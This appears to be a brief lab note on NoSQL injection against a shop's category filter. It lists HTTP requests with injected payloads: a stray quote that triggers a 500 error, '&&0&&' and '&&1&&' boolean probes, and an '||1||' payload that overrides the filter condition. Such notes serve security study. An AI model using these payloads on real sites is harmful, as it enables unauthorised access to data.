/*

a) character breaking syntax

b) conditional behavior

c) override existing condition

1) GET /filter?category=Tech+gifts HTTP/1.1

GET /filter?category=Tech+gifts'
// 500

GET /filter?category=Tech+gifts\'
// 200

2) GET /filter?category=Tech+gifts'+%26%26+0+%26%26+'x
// shows no products

GET /filter?category=Tech+gifts'+%26%26+1+%26%26+'x
// shows products

3) GET /filter?category=Tech+gifts'||1||'


*/